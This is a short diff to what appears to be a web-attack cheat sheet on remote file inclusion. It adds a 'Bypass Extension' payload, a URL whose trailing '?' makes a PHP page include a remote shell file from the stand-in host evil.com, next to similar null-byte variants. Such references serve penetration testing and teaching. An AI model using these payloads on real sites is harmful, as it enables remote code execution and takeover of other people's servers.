@@ -100,6 +100,12 @@ http://example.com/index.php?page=http://evil.com/shell.txt
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
+## Bypass Extension
+
+```powershell
+http://example.com/index.php?page=http://evil.com/shell.txt?
+```
+
 ### Double encoding
 
 ```powershell
